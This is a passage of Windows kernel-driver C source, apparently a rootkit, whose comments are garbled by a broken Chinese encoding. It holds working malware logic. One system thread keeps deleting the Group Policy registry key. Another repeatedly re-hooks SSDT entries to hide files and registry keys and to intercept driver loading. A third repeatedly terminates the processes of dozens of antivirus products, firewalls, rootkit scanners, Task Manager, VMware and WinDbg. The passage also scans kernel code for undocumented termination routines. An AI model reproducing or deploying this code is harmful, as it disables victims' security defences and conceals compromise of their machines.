	interval.QuadPart = -5 * 1000 * 10;     // 5ms, relative


	swprintf( Buffer, L"\\REGISTRY\\MACHINE\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\%s", L"GROUP POLICY" );
	RtlInitUnicodeString( &KeyName, Buffer );

	InitializeObjectAttributes(
		&objectAttributes,
		&KeyName,
		OBJ_CASE_INSENSITIVE,
		(HANDLE)NULL,
		NULL
		);

	while (TRUE) { 

		if (g_bRepeatWrite_reg_Group == FALSE) {
			PsTerminateSystemThread( STATUS_SUCCESS );
		}

		status = ZwOpenKey(
			&KeyHandle,
			KEY_READ | KEY_WRITE,
			&objectAttributes
			);

		if (NT_SUCCESS(status)) { //�����ڣ���ɾ����
			ZwDeleteKey( KeyHandle );
		}

		KeDelayExecutionThread( KernelMode, FALSE, &interval );
	} 
}

BOOL StartThread_reg_Group()
{
	HANDLE ThreadHandle;
	if (!NT_SUCCESS(PsCreateSystemThread (&ThreadHandle,
		THREAD_ALL_ACCESS,
		NULL,
		0L,
		NULL,
		Thread_WriteReg_Group,
		NULL))) {
			return FALSE;
	}

	ObReferenceObjectByHandle (ThreadHandle,
		THREAD_ALL_ACCESS,
		NULL,
		KernelMode,
		(PVOID *)&pThreadObj_reg_Group,
		NULL);


	g_bRepeatWrite_reg_Group = TRUE;
	ZwClose (ThreadHandle);
	return TRUE;
}

/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+                 ������3������������дSSDT                 +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		    																	--

VOID
Thread_WriteSDT (
				 IN PVOID StartContext
				 )
{
	LARGE_INTEGER interval;
	interval.QuadPart = -5 * 1000 * 10;     // 5ms, relative

	while (TRUE)  { 

		if (g_bRepeatWrite_sdt == FALSE) {
			PsTerminateSystemThread( STATUS_SUCCESS );
		}


		// 2
		if ( fake_ZwLoadDriver != (ZWLOADDRIVER) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase +  pos_LoadDriver )) ) {
			WPOFF();

			(ZWLOADDRIVER) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_LoadDriver)) = fake_ZwLoadDriver;

			WPON();
			ZwLoadDriver_Hooked = TRUE;
		}


		// 3
		if ( fake_ZwQueryDirectoryFile != (ZWQUERYDIRECTORYFILE) (*(((PServiceDescriptorTableEntry) \
			KeServiceDescriptorTable)->ServiceTableBase + pos_QueryDirectoryFile )) ) {
				WPOFF();
				(ZWQUERYDIRECTORYFILE) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase \
					+ pos_QueryDirectoryFile)) = fake_ZwQueryDirectoryFile;
				WPON();
				ZwQueryDirectoryFile_Hooked = TRUE;
		}

		// 4
		if ( fake_ZwSaveKey != (ZWSAVEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase \
			+ pos_SaveKey) ) ) {
				WPOFF();
				(ZWSAVEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + \
					pos_SaveKey) ) = fake_ZwSaveKey;
				WPON();
				ZwSaveKey_Hooked = TRUE;
		}

		// 5
		if ( fake_ZwDeleteKey != (ZWDELETEKEY) (*(((PServiceDescriptorTableEntry) \
			KeServiceDescriptorTable)->ServiceTableBase + pos_DeleteKey) ) ) {
				WPOFF();
				(ZWDELETEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + \
					pos_DeleteKey) ) = fake_ZwDeleteKey;
				WPON();
				ZwDeleteKey_Hooked = TRUE;
		}

		// 6
		if ( fake_ZwEnumerateKey != (ZWENUMERATEKEY) (*(((PServiceDescriptorTableEntry) \
			KeServiceDescriptorTable)->ServiceTableBase + pos_EnumerateKey) ) ) {
				WPOFF();
				(ZWENUMERATEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + \
					pos_EnumerateKey) ) = fake_ZwEnumerateKey;
				WPON();
				ZwEnumerateKey_Hooked = TRUE;
		}

		// 7
		if ( fake_ZwDeleteValueKey != (ZWDELETEVALUEKEY) (*(((PServiceDescriptorTableEntry) \
			KeServiceDescriptorTable)->ServiceTableBase + pos_DeleteValueKey) )  ) {
				WPOFF();
				(ZWDELETEVALUEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + \
					pos_DeleteValueKey) ) = fake_ZwDeleteValueKey;
				WPON();
				ZwDeleteValueKey_Hooked = TRUE;
		}

		KeDelayExecutionThread( KernelMode, FALSE, &interval );
	}
}

BOOL 
StartThread_sdt (
				 )
				 /*++

				 ����: sudami  08/02/28

				 ����:
				 ����һ��ϵͳ�߳�������дsdt

				 --*/
{
	HANDLE ThreadHandle;
	if (!NT_SUCCESS(PsCreateSystemThread (&ThreadHandle,
		THREAD_ALL_ACCESS,
		NULL,
		0L,
		NULL,
		Thread_WriteSDT,
		NULL))) {
			return FALSE;
	}

	ObReferenceObjectByHandle (ThreadHandle,
		THREAD_ALL_ACCESS,
		NULL,
		KernelMode,
		(PVOID *)&pThreadObj_sdt,
		NULL);


	g_bRepeatWrite_sdt = TRUE;
	//g_timeout.QuadPart = 100;

	//KeInitializeTimer( g_pKTimer_sdt );
	ZwClose (ThreadHandle);
	return TRUE;
}

/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+                 ���̺�ģ����ӵĻص�����                  +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		    																	--

ULONG  
GetProcessNameOffset( void )
{
	PEPROCESS curproc;
	int i;

	curproc = PsGetCurrentProcess();
	for( i = 0; i < 3*PAGE_SIZE; i++ ) {
		if( !strncmp( "System", (PCHAR)curproc + i, strlen("System") )) {
			return i;
		}
	}

	return 0;
}


/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+                 ��ָ���Ľ���,eg:KV 2008                   +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		    																	--

VOID
Thread_KillProc (
				 IN PVOID StartContext
				 )
{
	ULONG i;
	LARGE_INTEGER interval;
	interval.QuadPart = -5 * 1000 * 100;     // 5ms, relative

	while (TRUE)  { 

		if (IsExsitProc() == TRUE) { // �����˹�ע�Ľ���,����֮

			for (i=0; pObject[i] != NULL; i++) {
				My_TerminateProc( pObject[i], 0 );
			}
		}

		KeDelayExecutionThread( KernelMode, FALSE, &interval );
	}
}

BOOL 
StartThread_Kill (
				  )
				  /*++

				  ����: sudami  08/02/28

				  ����:
				  ����һ��ϵͳ�߳�������дsdt

				  --*/
{
	HANDLE ThreadHandle;
	if (!NT_SUCCESS(PsCreateSystemThread (&ThreadHandle,
		THREAD_ALL_ACCESS,
		NULL,
		0L,
		NULL,
		Thread_KillProc,
		NULL))) {
			return FALSE;
	}

	ObReferenceObjectByHandle (ThreadHandle,
		THREAD_ALL_ACCESS,
		NULL,
		KernelMode,
		(PVOID *)&pThreadObj_Kill,
		NULL);


	g_bRepeatWrite_Kill = TRUE;

	ZwClose (ThreadHandle);
	return TRUE;
}

//
// 
//
BOOL IsExsitProc()
{
	NTSTATUS           status;
	ULONG              size;
	SYSTEM_PROCESS_INFORMATION   *curr;
	PCHAR              pBuffer;
	WCHAR              Name[300];
	PEPROCESS		   Process;
	ULONG i, j, uRetSzie; 

	// ��ȡ������Ϣ
	pBuffer = NULL;
	size = 0x1000;
	pBuffer = ExAllocatePool( NonPagedPool, size );

	// �õ�ָ���Ľ��̶���
	i = 0;

	for (j=0; j < 128; j++ ) { // ���������
		pObject[j] = NULL;
	}


	do {
		status = ZwQuerySystemInformation( /*SystemProcessInformation*/5, \
			pBuffer, size, &uRetSzie );

		if (status == STATUS_INFO_LENGTH_MISMATCH) {
			ExFreePool( pBuffer );
			size *= 2;
			pBuffer = ExAllocatePool( NonPagedPool, size ); 

		} else if ( !NT_SUCCESS (status) ) {
			DbgPrint(" ZwQuerySystemInformation error\n"); 
			ExFreePool( pBuffer ); 

			return STATUS_UNSUCCESSFUL;
		}

	} while (status == STATUS_INFO_LENGTH_MISMATCH);

	curr = (SYSTEM_PROCESS_INFORMATION*) pBuffer;
	do {

		if ( curr->ImageName.Buffer != NULL ) {
			RtlCopyMemory(Name , curr->ImageName.Buffer, curr->ImageName.MaximumLength );
			_wcsupr(Name);

			//------------------����------------------

			if ( wcsstr( Name, L"KVXP" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("KvXP.kxp ���� KV ɱ����������� \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"KVSRVXP" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("KVSrvXP.exe ���� KV ɱ�����ϵͳ���� \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"KVWSC" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("KVwsc.exe���� KV ɱ�������ȫ��֤���� \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"KVMONXP" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("KVMonXP.kxp���� KV ɱ�����ʵʱ��س��� \n"); 
					i++;
				}
			}

			//----------------------��ɽ--------------------

			if ( wcsstr( Name, L"KAVSVCUI" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("KAVSvcUI.exe   ��ɽ���Դ�ܼ�\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"KAVPFW" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("KAVPFW.EXE     ��ɽ�����������ǽ��\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"KAV32" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("KAV32.exe   ��ɽ����������\n"); 
					i++;
				}
			}

			//------------------����------------------

			if ( wcsstr( Name, L"KAVSVC" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("KAVsvc.exe ����˹�����ɽ���ԵĲ�����ʱ������\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"AVPM" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("AVPM.EXE         ����˹����س���\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"AVPCC" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("AVPCC.EXE     ����˹�� \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"AVP32" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("AVP32.EXE     ����˹��\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"AVP.EXE" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("AVP.EXE         ����˹��ɱ�������س���\n"); 
					i++;
				}
			}

			//------------------����------------------

			if ( wcsstr( Name, L"RAVMOND" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("RAVmonD.exe����ɱ�����ʵʱ��س��� \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"RAVMON.EXE" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("RAVmon.exe \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"RAVTIMER" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("RAVtimer.exe����ɱ�������س���  \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"RISING" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("Rising.exe\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"RAV.EXE" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("Rav.exe   ����ɱ����������� \n"); 
					i++;
				}
			}

			//------------------΢��------------------

			if ( wcsstr( Name, L"MPSVC" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("΢�� 1\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"MPSVC1" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("΢�� 2\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"MPSVC2" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("΢�� 3\n"); 
					i++;
				}
			}	

			//------------------360------------------
			if ( wcsstr( Name, L"360SAFE" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("360Safe.exe \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"360TRAY" ) != NULL ) {
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("360tray.exe  \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"HIJACKTHIS" ) != NULL ) {
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("HijackThis.exe  \n"); 
					i++;
				}
			}

			//------------------ARK------------------
			if ( wcsstr( Name, L"ICESWORD" ) != NULL ) { // IS
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("IS\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"WSYSCHECK" ) != NULL ) { // WSYSCHECK
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("WSYSCHECK\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"SNIPESWORD" ) != NULL ) { // �ѽ�
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("�ѽ�\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"A121IS" ) != NULL ) { //  RKU
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("RKU\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"GMER" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("GMER\n"); 
					i++;
				}
			}

			//------------------����------------------
			if ( wcsstr( Name, L"THGUARD" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("THGUARD.EXE   TrojanHunter ��������� \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"PFW" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("PFW.EXE ��������ǽ���˰�\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"ZONEALARM" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("ZONEALARM.EXE-------����ǽZoneAlarm\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"VSHWIN32" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("VSHWIN32.EXE �󿧷�\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"TBSCAN" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("TBSCAN.EXE--���ķ�����������ڶԻ����º�δ֪��������Ƚ����� \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"SWEEP95" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("SWEEP95.EXE--------------ɱ����� \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"SMC.EXE" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("SMC.EXE   Sygate Personal Firewall ���˷���ǽ \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"NMAIN.EXE" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("NMAIN.EXE \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"LUALL" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("LUALL.EXE  Symantec LiveUpdate ������������  \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"ICMON.EXE" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("ICMON.EXE    Sophos ����������Ļ���������� \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"APVXDWIN" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("APVXDWIN.EXE ��è��ʿ \n"); 
					i++;
				}
			}

			//   qq
			if ( wcsstr( Name, L"QQ" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("QQ \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"TASK" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("��������� \n"); 
					i++;
				}
			}

			// VMVARE
			if ( wcsstr( Name, L"VMWARE-VMX" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("VMWARE-VMX \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"VMWARE" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("VMWARE.EXE \n"); 
					i++;
				}
			}

			// Windbg
			if ( wcsstr( Name, L"WINDBG" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("Windbg.EXE \n"); 
					i++;
				}
			}

		}

		if ( curr->NextEntryOffset ) { // ���ε�������,ֱ������
			(char*)curr += curr->NextEntryOffset;
		}

	} while (curr->NextEntryOffset);

	ExFreePool( pBuffer ); 

	if ( 0 == i ) {
		return FALSE;
	}

	DbgPrint("Our concerned Process counts: %d\n", i); 

	return TRUE;
}


ULONG 
GetFunctionAddr( 
				IN PCWSTR FunctionName
				)
{
	UNICODE_STRING UniCodeFunctionName;

	RtlInitUnicodeString( &UniCodeFunctionName, FunctionName );
	return (ULONG)MmGetSystemRoutineAddress( &UniCodeFunctionName );    

}

/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+   �õ�KeAcquireInStackQueuedSpinLockRaiseToSynch�ĵ�ַ    +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		    																	--



//
//
//

VOID XPGetPsGetNextProcessThread()
{
	PUCHAR cPtr;
	PUCHAR addr;
	int i = 0;

	//DbgPrint("��ʼ��PsGetNextProcessThread \n");

	if( NULL == NtTerminateProcess) {
		DbgPrint( "NtTerminateProcess NULL == \n" );
		return;
	}

	for (cPtr = (PUCHAR)NtTerminateProcess; 
		cPtr < ((PUCHAR)NtTerminateProcess + PAGE_SIZE); 
		cPtr++) {

			//DbgPrint("cPtr: \t0x%08x \n", cPtr);
			if (*cPtr == 0xE8/* && *(PUSHORT)(cPtr + 5) == 0x8BF0 && *(PUSHORT)(cPtr + 7) == 0x85F6*/) {
				i++;
				//DbgPrint("--- ������--- \n");

				if( 3 == i ) {
					g_PsGetNextProcessThread = 
						(My_PsGetNextProcessThread)(*(PULONG)(cPtr + 1) + (ULONG)cPtr + 5);
					DbgPrint( "PsGetNextProcessThread:\t0x%08x\n", (ULONG)g_PsGetNextProcessThread );

					break;
				}
			}
	}

	// ���� KiInsertQueueApc �ĵ�ַ

	addr = (PUCHAR) GetFunctionAddr( L"KeInsertQueueApc" );
	DbgPrint( "KeInsertQueueApc:\t0x%08x\n", addr );

	for (cPtr = (PUCHAR)addr; 
		cPtr < (PUCHAR)addr + PAGE_SIZE; 
		cPtr++)
	{
		if (*cPtr == 0xE8 && *(PUSHORT)(cPtr + 5) == 0xD88A) {

			KiInsertQueueApc = (KIINSERTQUEUEAPC)(*(PULONG)(cPtr + 1) + (ULONG)cPtr + 5);
			DbgPrint( "KiInsertQueueApc:\t0x%08x\n", (ULONG)KiInsertQueueApc );
			break;
		}
	}

	if ( FALSE == g_bMP ) { // ������΢�㣬����

		DbgPrint( "PsTerminateSystemThread:\t0x%08x\n", PsTerminateSystemThread );

		for (cPtr = (PUCHAR)PsTerminateSystemThread; 
			cPtr < (PUCHAR)PsTerminateSystemThread + PAGE_SIZE; 
			cPtr++)
		{
			if (*cPtr == 0xE8 && *(PUSHORT)(cPtr + 5) == 0xC25D) 
			{
				PspTerminateThreadByPointer = 
					(PSPTERMINATETHREADBYPOINTER)(*(PULONG)(cPtr + 1) + (ULONG)cPtr + 5);
				DbgPrint( "PspTerminateThreadByPointer:\t0x%08x\n", 
					(ULONG)PspTerminateThreadByPointer );

				// ����PspExitThread�ĵ�ַ
				for (cPtr = (PUCHAR)PspTerminateThreadByPointer; 
					cPtr < (PUCHAR)PspTerminateThreadByPointer + PAGE_SIZE; 
					cPtr++)
				{
					if (*cPtr == 0xE8 && *(PUSHORT)(cPtr + 5) == 0x9090) {

						PspExitThread = (PSPEXITTHREAD)(*(PULONG)(cPtr + 1) + (ULONG)cPtr + 5);
						DbgPrint( "PspExitThread:\t0x%08x\n", (ULONG)PspExitThread );
						break;
					}
				}

				break;
			}
		}
	}
}





/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+              �õ�PsGetNextProcessThread�ĵ�ַ             +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		    																	--


VOID
FindPsXXAddr()
{
	HANDLE hThread;
	PVOID objtowait;
	NTSTATUS st;

	st = PsCreateSystemThread(
		&hThread,
		0,
		NULL,
		(HANDLE)0,
		NULL,
		DoFind,
		NULL);

	if ((KeGetCurrentIrql())!=PASSIVE_LEVEL) {
		st=KfRaiseIrql(PASSIVE_LEVEL);
	}

	if ((KeGetCurrentIrql())!=PASSIVE_LEVEL) {
		return;
	}

	objtowait = 0;
	ObReferenceObjectByHandle(
		hThread,
		THREAD_ALL_ACCESS,
		NULL,
		KernelMode,
		&objtowait,
		NULL
		); 

	st = KeWaitForSingleObject( objtowait, Executive, KernelMode, FALSE, NULL );
}

VOID 
DoFind (
		IN PVOID pContext
		)
{
	PUCHAR cPtr;
	PUCHAR addr;
	ULONG i;
	ULONG code1_sp2=0x8B55FF8B,code2_sp2=0x565351EC,code3_sp2=0x24A16457,code4_sp2=0x8B000001;
	ULONG code5_sp2=0xD88B087D;

	ULONG code1_KeForceResumeThread=0x8B55FF8B,code2_KeForceResumeThread=0x575653EC,code3_KeForceResumeThread=0x15FFC933,code4_KeForceResumeThread=0x80801088;
	ULONG code5_KeForceResumeThread=0x458BD88A;

	ULONG code1_PspExitThread=0x1068606A,code2_PspExitThread=0xE8808155,code3_PspExitThread=0xFFF6F7AB,code4_PspExitThread=0x0124A164;
	ULONG code5_PspExitThread=0xF08B0000;

	PIMAGE_FILE_HEADER	pfh;
	PIMAGE_OPTIONAL_HEADER	poh;
	PIMAGE_SECTION_HEADER	psh;

	BOOL bFind_1 = FALSE;
	BOOL bFind_2 = FALSE;
	BOOL bFind_3 = FALSE;
	ULONG sudami_1;
	FILE_STANDARD_INFORMATION	fsi;
	NTSTATUS            ntStatus = STATUS_SUCCESS;
	ULONG               ModuleBase = 0;
	HANDLE              ntFileHandle;
	LARGE_INTEGER       byteOffset;
	ULONG               NtHeadersOffset;
	ULONG               AddressOfEntryPoint;
	ULONG               SizeOfImage;
	ULONG               ImageBase;
	ULONG               NeedSize;
	ULONG               Delta;
	PUCHAR              FileContent;
	UNICODE_STRING   	FileName;	
